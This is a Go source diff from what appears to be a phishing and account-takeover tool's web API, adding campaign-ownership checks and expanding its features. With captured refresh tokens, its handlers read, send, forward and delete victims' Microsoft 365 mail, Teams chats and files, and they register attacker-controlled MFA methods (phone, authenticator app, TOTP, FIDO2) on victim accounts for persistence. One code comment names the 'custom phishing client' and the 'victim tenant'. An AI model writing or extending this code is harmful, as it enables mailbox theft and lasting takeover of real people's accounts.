-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetCurrentUser(context.Background())
@@ -1278,6 +1714,9 @@ func sanitizeFilename(s string) string {
 
 func (h *Handler) exportCampaign(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	export, err := h.Manager.ExportCampaign(id)
 	if err != nil {
 		writeError(w, 404, err.Error())
@@ -1296,6 +1735,9 @@ func (h *Handler) exportCampaign(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) deleteCampaign(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	if err := h.Manager.DeleteCampaign(id); err != nil {
 		writeError(w, 404, err.Error())
 		return
@@ -1307,9 +1749,8 @@ func (h *Handler) deleteCampaign(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) streamEvents(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
-	c, ok := h.Manager.GetCampaign(id)
+	c, ok := h.campaignAccess(w, r, id)
 	if !ok {
-		writeError(w, 404, "campaign not found")
 		return
 	}
 
@@ -1349,6 +1790,13 @@ func (h *Handler) streamEvents(w http.ResponseWriter, r *http.Request) {
 	for {
 		select {
 		case <-r.Context().Done():
+			return
+		case <-c.DoneCh():
+			// Campaign was stopped server-side — send a final status update, then hold
+			// the connection open until the client disconnects. This prevents the browser's
+			// EventSource from entering a rapid reconnect loop on an already-stopped campaign.
+			sendUpdate()
+			<-r.Context().Done()
 			return
 		case <-c.NotifyCh():
 			// Immediate push — QR scan or other server-side event created sessions.
@@ -1421,6 +1869,9 @@ func (h *Handler) webhookLogs(w http.ResponseWriter, r *http.Request) {
 func (h *Handler) graphDriveUpload(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
 	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	folderItemID := r.URL.Query().Get("folder")
 	if err := r.ParseMultipartForm(32 << 20); err != nil {
 		writeError(w, 400, "multipart parse failed")
@@ -1449,6 +1900,9 @@ func (h *Handler) graphDriveUpload(w http.ResponseWriter, r *http.Request) {
 func (h *Handler) graphDriveDelete(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
 	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	itemID := r.URL.Query().Get("item")
 	if itemID == "" {
 		writeError(w, 400, "item parameter required")
@@ -1467,9 +1921,8 @@ func (h *Handler) graphDriveDelete(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphDriveRecent(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.ListRecentDriveItems(context.Background())
@@ -1484,9 +1937,8 @@ func (h *Handler) graphDriveRecent(w http.ResponseWriter, r *http.Request) {
 // --- Mail handlers ---
 
 func (h *Handler) graphMailFolders(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetMailFolders(context.Background(), r.URL.Query().Get("mailbox"))
@@ -1501,6 +1953,9 @@ func (h *Handler) graphMailFolders(w http.ResponseWriter, r *http.Request) {
 func (h *Handler) graphMailMessages(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
 	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	folderID := r.URL.Query().Get("folder")
 	mailboxID := r.URL.Query().Get("mailbox")
 	top := 25
@@ -1523,9 +1978,8 @@ func (h *Handler) graphMailMessages(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphMailGetMessage(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetMailMessage(context.Background(), r.PathValue("msgId"))
@@ -1540,6 +1994,9 @@ func (h *Handler) graphMailGetMessage(w http.ResponseWriter, r *http.Request) {
 func (h *Handler) graphMailSend(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
 	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	var body struct {
 		To      []string `json:"to"`
 		Subject string   `json:"subject"`
@@ -1564,6 +2021,9 @@ func (h *Handler) graphMailSend(w http.ResponseWriter, r *http.Request) {
 func (h *Handler) graphMailReply(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
 	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	msgID := r.PathValue("msgId")
 	var body struct {
 		Comment string `json:"comment"`
@@ -1584,6 +2044,9 @@ func (h *Handler) graphMailReply(w http.ResponseWriter, r *http.Request) {
 func (h *Handler) graphMailForward(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
 	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	msgID := r.PathValue("msgId")
 	var body struct {
 		To      []string `json:"to"`
@@ -1606,9 +2069,8 @@ func (h *Handler) graphMailForward(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphMailDelete(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	if err := gc.DeleteMessage(context.Background(), r.PathValue("msgId")); err != nil {
@@ -1626,9 +2088,8 @@ func (h *Handler) graphMailMove(w http.ResponseWriter, r *http.Request) {
 		writeError(w, 400, "dest_folder_id required")
 		return
 	}
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.MoveMessage(context.Background(), r.PathValue("msgId"), body.DestFolderID)
@@ -1644,6 +2105,9 @@ func (h *Handler) graphMailMove(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) graphAuthMethods(w http.ResponseWriter, r *http.Request) {
 	id, targetID := r.PathValue("id"), r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	gc, err := h.graphClient(id, targetID)
 	if err != nil {
 		writeError(w, 404, err.Error())
@@ -1697,9 +2161,8 @@ func (h *Handler) graphAuthMethods(w http.ResponseWriter, r *http.Request) {
 // --- Teams interactive ---
 
 func (h *Handler) graphTeamChannels(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetTeamChannels(context.Background(), r.PathValue("teamId"))
@@ -1712,9 +2175,8 @@ func (h *Handler) graphTeamChannels(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphChannelMessages(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetChannelMessages(context.Background(), r.PathValue("teamId"), r.PathValue("chanId"))
@@ -1729,6 +2191,9 @@ func (h *Handler) graphChannelMessages(w http.ResponseWriter, r *http.Request) {
 func (h *Handler) graphSendChannelMessage(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
 	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	var body struct {
 		Content string `json:"content"`
 	}
@@ -1751,9 +2216,8 @@ func (h *Handler) graphSendChannelMessage(w http.ResponseWriter, r *http.Request
 }
 
 func (h *Handler) graphChatMessages(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetChatMessages(context.Background(), r.PathValue("chatId"))
@@ -1768,6 +2232,9 @@ func (h *Handler) graphChatMessages(w http.ResponseWriter, r *http.Request) {
 func (h *Handler) graphSendChatMessage(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
 	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	var body struct {
 		Content string `json:"content"`
 	}
@@ -1792,6 +2259,9 @@ func (h *Handler) graphSendChatMessage(w http.ResponseWriter, r *http.Request) {
 func (h *Handler) graphCreateChat(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
 	targetID := r.PathValue("targetId")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return
+	}
 	var body struct {
 		MemberIDs []string `json:"member_ids"`
 		ChatType  string   `json:"chat_type"`
@@ -1820,9 +2290,8 @@ func (h *Handler) graphCreateChat(w http.ResponseWriter, r *http.Request) {
 // --- Group detail handlers ---
 
 func (h *Handler) graphGroupInfo(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetGroupInfo(context.Background(), r.PathValue("groupId"))
@@ -1835,9 +2304,8 @@ func (h *Handler) graphGroupInfo(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphGroupMembers(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetGroupMembers(context.Background(), r.PathValue("groupId"))
@@ -1850,9 +2318,8 @@ func (h *Handler) graphGroupMembers(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphGroupTransitiveMembers(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetGroupTransitiveMembers(context.Background(), r.PathValue("groupId"))
@@ -1865,9 +2332,8 @@ func (h *Handler) graphGroupTransitiveMembers(w http.ResponseWriter, r *http.Req
 }
 
 func (h *Handler) graphGroupOwners(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetGroupOwners(context.Background(), r.PathValue("groupId"))
@@ -1880,9 +2346,8 @@ func (h *Handler) graphGroupOwners(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphGroupMemberOf(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetGroupMemberOf(context.Background(), r.PathValue("groupId"))
@@ -1895,9 +2360,8 @@ func (h *Handler) graphGroupMemberOf(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphGroupDrives(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetGroupDrives(context.Background(), r.PathValue("groupId"))
@@ -1910,9 +2374,8 @@ func (h *Handler) graphGroupDrives(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphGroupSites(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetGroupSites(context.Background(), r.PathValue("groupId"))
@@ -1925,9 +2388,8 @@ func (h *Handler) graphGroupSites(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphGroupAppRoles(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetGroupAppRoles(context.Background(), r.PathValue("groupId"))
@@ -1942,9 +2404,8 @@ func (h *Handler) graphGroupAppRoles(w http.ResponseWriter, r *http.Request) {
 // --- User detail handlers ---
 
 func (h *Handler) graphUserInfo(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetUserInfo(context.Background(), r.PathValue("userId"))
@@ -1957,9 +2418,8 @@ func (h *Handler) graphUserInfo(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphUserMemberOf(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetUserMemberOf(context.Background(), r.PathValue("userId"))
@@ -1985,9 +2445,8 @@ func GenerateUserCodeCSV(w io.Writer, sessions map[string]interface{}) error {
 // ─── Graph: M365 Search ───────────────────────────────────────────────────────
 
 func (h *Handler) graphSearch(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	var body struct {
@@ -2011,9 +2470,8 @@ func (h *Handler) graphSearch(w http.ResponseWriter, r *http.Request) {
 // ─── Graph: Drive extra ───────────────────────────────────────────────────────
 
 func (h *Handler) graphDriveShared(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetSharedWithMe(context.Background())
@@ -2028,9 +2486,8 @@ func (h *Handler) graphDriveShared(w http.ResponseWriter, r *http.Request) {
 // ─── Graph: Mail extra ───────────────────────────────────────────────────────
 
 func (h *Handler) graphMailListAttachments(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.ListMessageAttachments(context.Background(), r.PathValue("msgId"))
@@ -2043,9 +2500,8 @@ func (h *Handler) graphMailListAttachments(w http.ResponseWriter, r *http.Reques
 }
 
 func (h *Handler) graphMailDownloadAttachment(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	data, ct, err := gc.DownloadMessageAttachment(context.Background(), r.PathValue("msgId"), r.PathValue("attId"))
@@ -2060,9 +2516,8 @@ func (h *Handler) graphMailDownloadAttachment(w http.ResponseWriter, r *http.Req
 }
 
 func (h *Handler) graphMailPermanentDelete(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	if err := gc.PermanentDeleteMessage(context.Background(), r.PathValue("msgId")); err != nil {
@@ -2073,9 +2528,8 @@ func (h *Handler) graphMailPermanentDelete(w http.ResponseWriter, r *http.Reques
 }
 
 func (h *Handler) graphMailCreateDraft(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	var body struct {
@@ -2094,9 +2548,8 @@ func (h *Handler) graphMailCreateDraft(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) graphMailAddAttachment(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	r.ParseMultipartForm(32 << 20)
@@ -2119,9 +2572,8 @@ func (h *Handler) graphMailAddAttachment(w http.ResponseWriter, r *http.Request)
 }
 
 func (h *Handler) graphMailSendDraft(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	if err := gc.SendDraft(context.Background(), r.PathValue("msgId")); err != nil {
@@ -2134,9 +2586,8 @@ func (h *Handler) graphMailSendDraft(w http.ResponseWriter, r *http.Request) {
 // ─── Graph: User batch ────────────────────────────────────────────────────────
 
 func (h *Handler) graphUserBatch(w http.ResponseWriter, r *http.Request) {
-	gc, err := h.graphClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	gc, ok := h.graphAccess(w, r)
+	if !ok {
 		return
 	}
 	result, err := gc.GetUserDetailsBatch(context.Background(), r.PathValue("userId"))
@@ -2151,6 +2602,9 @@ func (h *Handler) graphUserBatch(w http.ResponseWriter, r *http.Request) {
 // ─── Graph: Custom request ────────────────────────────────────────────────────
 
 func (h *Handler) graphCustomRequest(w http.ResponseWriter, r *http.Request) {
+	if _, ok := h.campaignAccess(w, r, r.PathValue("id")); !ok {
+		return
+	}
 	token, err := h.Manager.GetTokenByTargetID(r.PathValue("id"), r.PathValue("targetId"))
 	if err != nil {
 		writeError(w, 404, err.Error())
@@ -2225,6 +2679,7 @@ func isTokenExpiredErr(err error) bool {
 // AADSTS65002 fires when two Microsoft first-party apps lack mutual
 // preauthorization, so we walk this list until one succeeds.
 var mfaFallbackClients = []string{
+	"d3590ed6-52b3-4102-aeff-aad2292ab01c", // Office 365 — preauthorized for My Sign-ins
 	"1b730954-1685-4b74-9bfd-dac224a7b894", // Azure PowerShell
 	"04b07795-8ddb-461a-bbee-02f9e1bf7b46", // Azure CLI
 	"c44b4083-3bb0-49c1-b47d-974e53cbdf3c", // Azure Portal
@@ -2251,17 +2706,13 @@ func (h *Handler) mfaClient(campaignID, targetID string) (*mfapkg.Client, error)
 		tenantID = "organizations"
 	}
 
-	// Fast revocation check: try a plain Graph refresh before attempting the
-	// mysignins exchange. AADSTS70000 on a Graph exchange means the refresh
-	// token itself is invalid/revoked (e.g. MFA enforcement just changed the
-	// required claims), NOT a scope/client mismatch.
-	_, graphErr := tokenexchange.Exchange(ctx, tenantID, h.Manager.ClientID(), token.RefreshToken,
-		"https://graph.microsoft.com", "", true)
-	if graphErr != nil && strings.Contains(graphErr.Error(), "AADSTS70000") {
-		return nil, fmt.Errorf(
-			"refresh token for %s has been revoked (AADSTS70000) — this typically happens when MFA is newly enforced on the tenant and the captured session lacked MFA claims. Re-capture required.",
-			token.TargetEmail)
-	}
+	// Fast revocation check: try a plain Graph refresh with a known first-party
+	// client (Office 365) to detect a truly revoked RT. We intentionally do NOT
+	// use h.Manager.ClientID() here: a custom phishing client won't have Graph
+	// consent in the victim tenant, so AADSTS70000/65002 on the campaign client
+	// is a client-authorization failure, not an RT revocation signal.
+	_, graphErr := tokenexchange.Exchange(ctx, tenantID, "d3590ed6-52b3-4102-aeff-aad2292ab01c",
+		token.RefreshToken, "https://graph.microsoft.com", "", true)
 	if isTokenExpiredErr(graphErr) {
 		return nil, fmt.Errorf("refresh token expired or revoked for %s — re-capture required", token.TargetEmail)
 	}
@@ -2310,13 +2761,27 @@ func (h *Handler) mfaClient(campaignID, targetID string) (*mfapkg.Client, error)
 	return nil, fmt.Errorf("MFA token exchange failed — the target tenant may not have MFA/SSPR provisioned, or no client ID is preauthorized for the My Sign-ins API: %w", lastErr)
 }
 
-func (h *Handler) mfaListMethods(w http.ResponseWriter, r *http.Request) {
-	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
+// mfaAccess enforces campaign ownership then returns an authenticated MFA client.
+func (h *Handler) mfaAccess(w http.ResponseWriter, r *http.Request) (*mfapkg.Client, bool) {
+	id := r.PathValue("id")
+	if _, ok := h.campaignAccess(w, r, id); !ok {
+		return nil, false
+	}
+	mc, err := h.mfaClient(id, r.PathValue("targetId"))
 	if err != nil {
 		writeError(w, 404, err.Error())
+		return nil, false
+	}
+	return mc, true
+}
+
+func (h *Handler) mfaListMethods(w http.ResponseWriter, r *http.Request) {
+	client, ok := h.mfaAccess(w, r)
+	if !ok {
 		return
 	}
-	result, err := client.ListAvailableMethods(context.Background())
+	sessionCtx := r.URL.Query().Get("sessionCtx")
+	result, err := client.ListAvailableMethods(context.Background(), sessionCtx)
 	if err != nil {
 		writeError(w, 500, err.Error())
 		return
@@ -2326,9 +2791,8 @@ func (h *Handler) mfaListMethods(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) mfaGetSession(w http.ResponseWriter, r *http.Request) {
-	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	client, ok := h.mfaAccess(w, r)
+	if !ok {
 		return
 	}
 	ctx, err := client.GetSessionCtx(context.Background())
@@ -2340,18 +2804,21 @@ func (h *Handler) mfaGetSession(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) mfaAddPhone(w http.ResponseWriter, r *http.Request) {
-	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	client, ok := h.mfaAccess(w, r)
+	if !ok {
 		return
 	}
 	var body struct {
-		PhoneType  int    `json:"phoneType"`
-		Phone      string `json:"phone"`
-		SessionCtx string `json:"sessionCtx"`
+		PhoneType   int    `json:"phoneType"`
+		Phone       string `json:"phone"`
+		CountryCode string `json:"countryCode"`
+		SessionCtx  string `json:"sessionCtx"`
 	}
 	json.NewDecoder(r.Body).Decode(&body)
-	result, err := client.AddPhoneMethod(context.Background(), body.PhoneType, body.Phone, body.SessionCtx)
+	if body.CountryCode == "" {
+		body.CountryCode = "1"
+	}
+	result, err := client.AddPhoneMethod(context.Background(), body.PhoneType, body.Phone, body.CountryCode, body.SessionCtx)
 	if err != nil {
 		writeError(w, 500, err.Error())
 		return
@@ -2361,9 +2828,8 @@ func (h *Handler) mfaAddPhone(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) mfaAddEmail(w http.ResponseWriter, r *http.Request) {
-	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	client, ok := h.mfaAccess(w, r)
+	if !ok {
 		return
 	}
 	var body struct {
@@ -2381,9 +2847,8 @@ func (h *Handler) mfaAddEmail(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) mfaAddApp(w http.ResponseWriter, r *http.Request) {
-	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	client, ok := h.mfaAccess(w, r)
+	if !ok {
 		return
 	}
 	var body struct {
@@ -2392,19 +2857,44 @@ func (h *Handler) mfaAddApp(w http.ResponseWriter, r *http.Request) {
 		SessionCtx string `json:"sessionCtx"`
 	}
 	json.NewDecoder(r.Body).Decode(&body)
-	result, err := client.AddMobileAppMethod(context.Background(), body.AppType, body.SecretKey, body.SessionCtx)
+	if body.AppType == 0 {
+		body.AppType = mfapkg.MethodAuthenticatorOTPOnly
+	}
+	// First initialize, then add the method
+	initRaw, err := client.InitializeMobileAppRegistration(context.Background(), body.AppType, body.SessionCtx)
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	// If caller provided a secret key, use it; otherwise extract from init response
+	secretKey := body.SecretKey
+	if secretKey == "" {
+		var initResp struct {
+			SecretKey string `json:"secretKey"`
+		}
+		json.Unmarshal(initRaw, &initResp)
+		secretKey = initResp.SecretKey
+	}
+	result, err := client.AddMobileAppMethod(context.Background(), body.AppType, secretKey, body.SessionCtx)
 	if err != nil {
 		writeError(w, 500, err.Error())
 		return
 	}
 	w.Header().Set("Content-Type", "application/json")
-	w.Write(result)
+	// Merge init and add responses for the frontend
+	merged := map[string]interface{}{}
+	json.Unmarshal(initRaw, &merged)
+	var addMap map[string]interface{}
+	json.Unmarshal(result, &addMap)
+	for k, v := range addMap {
+		merged[k] = v
+	}
+	json.NewEncoder(w).Encode(merged)
 }
 
 func (h *Handler) mfaRegisterTOTP(w http.ResponseWriter, r *http.Request) {
-	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	client, ok := h.mfaAccess(w, r)
+	if !ok {
 		return
 	}
 	var body struct {
@@ -2426,18 +2916,18 @@ func (h *Handler) mfaRegisterTOTP(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) mfaVerify(w http.ResponseWriter, r *http.Request) {
-	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	client, ok := h.mfaAccess(w, r)
+	if !ok {
 		return
 	}
 	var body struct {
-		VerificationID string `json:"verificationId"`
-		Code           string `json:"code"`
-		SessionCtx     string `json:"sessionCtx"`
+		MethodType          int    `json:"methodType"`
+		VerificationContext string `json:"verificationContext"`
+		Code                string `json:"code"`
+		SessionCtx          string `json:"sessionCtx"`
 	}
 	json.NewDecoder(r.Body).Decode(&body)
-	result, err := client.VerifyMethod(context.Background(), body.VerificationID, body.Code, body.SessionCtx)
+	result, err := client.VerifyMethod(context.Background(), body.MethodType, body.VerificationContext, body.Code, body.SessionCtx)
 	if err != nil {
 		writeError(w, 500, err.Error())
 		return
@@ -2447,17 +2937,17 @@ func (h *Handler) mfaVerify(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) mfaDeleteMethod(w http.ResponseWriter, r *http.Request) {
-	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	client, ok := h.mfaAccess(w, r)
+	if !ok {
 		return
 	}
 	var body struct {
+		MethodType int    `json:"methodType"`
 		MethodID   string `json:"methodId"`
 		SessionCtx string `json:"sessionCtx"`
 	}
 	json.NewDecoder(r.Body).Decode(&body)
-	if err := client.DeleteMethod(context.Background(), body.MethodID, body.SessionCtx); err != nil {
+	if err := client.DeleteMethod(context.Background(), body.MethodType, body.MethodID, body.SessionCtx); err != nil {
 		writeError(w, 500, err.Error())
 		return
 	}
@@ -2465,9 +2955,8 @@ func (h *Handler) mfaDeleteMethod(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) mfaFIDO2Begin(w http.ResponseWriter, r *http.Request) {
-	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	client, ok := h.mfaAccess(w, r)
+	if !ok {
 		return
 	}
 	var body struct {
@@ -2488,13 +2977,13 @@ func (h *Handler) mfaFIDO2Begin(w http.ResponseWriter, r *http.Request) {
 }
 
 func (h *Handler) mfaFIDO2Complete(w http.ResponseWriter, r *http.Request) {
-	client, err := h.mfaClient(r.PathValue("id"), r.PathValue("targetId"))
-	if err != nil {
-		writeError(w, 404, err.Error())
+	client, ok := h.mfaAccess(w, r)
+	if !ok {
 		return
 	}
 	var body struct {
-		VerificationID      string          `json:"verificationId"`
+		MethodType          int             `json:"methodType"`
+		VerificationContext string          `json:"verificationContext"`
 		SessionCtx          string          `json:"sessionCtx"`
 		AttestationResponse json.RawMessage `json:"attestationResponse"`
 	}
@@ -2502,7 +2991,10 @@ func (h *Handler) mfaFIDO2Complete(w http.ResponseWriter, r *http.Request) {
 		writeError(w, 400, "invalid request body")
 		return
 	}
-	result, err := client.CompleteFIDO2Registration(context.Background(), body.VerificationID, body.AttestationResponse, body.SessionCtx)
+	if body.MethodType == 0 {
+		body.MethodType = mfapkg.MethodFIDO2
+	}
+	result, err := client.CompleteFIDO2Registration(context.Background(), body.MethodType, body.VerificationContext, body.AttestationResponse, body.SessionCtx)
 	if err != nil {
 		writeError(w, 500, err.Error())
 		return
